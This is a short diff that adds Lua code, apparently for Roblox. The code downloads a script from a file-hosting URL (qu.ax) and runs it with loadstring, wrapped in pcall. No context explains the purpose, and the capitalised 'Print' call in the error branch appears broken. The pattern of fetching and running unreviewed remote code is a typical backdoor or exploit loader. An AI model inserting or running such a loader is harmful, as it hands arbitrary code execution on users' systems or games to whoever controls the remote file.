@@ -1,0 +1,7 @@
+       local scriptUrl2 = "https://qu.ax/uWlZZ.txt"
+       local success, err = pcall(function()
+      loadstring(game:HttpGet(scriptUrl2))()
+        end)
+        if not success then
+        Print("خطاء")
+        end
